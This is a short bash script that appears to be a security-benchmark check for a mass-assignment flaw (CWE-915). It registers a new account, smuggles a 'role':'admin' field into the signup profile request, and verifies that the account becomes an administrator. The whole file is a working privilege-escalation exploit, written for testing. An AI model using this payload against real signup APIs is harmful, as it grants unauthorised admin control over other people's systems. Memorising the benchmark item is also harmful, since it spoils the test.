#!/usr/bin/env bash
# SIGNUP-MASSASSIGN-001 (CWE-915): the profile step fills the draft from the body,
# so registration can name its own role. The finished account is a real admin.
set -eu; . "$(dirname "$0")/_lib.sh"
EMAIL="escalate-$$@bench.local"
DRAFT=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$EMAIL\"}" | jget draftId)
[ -n "$DRAFT" ]
curl -s -X POST "$TARGET/api/signup/profile" -H 'content-type: application/json' \
  -d "{\"draftId\":$DRAFT,\"display_name\":\"Mallory\",\"role\":\"admin\",\"org_slug\":\"globex\"}" >/dev/null
curl -s -X POST "$TARGET/api/signup/complete" -H 'content-type: application/json' \
  -d "{\"draftId\":$DRAFT,\"password\":\"Escalate123!\"}" >/dev/null
[ "$(user_admin "$EMAIL")" = "True" ]
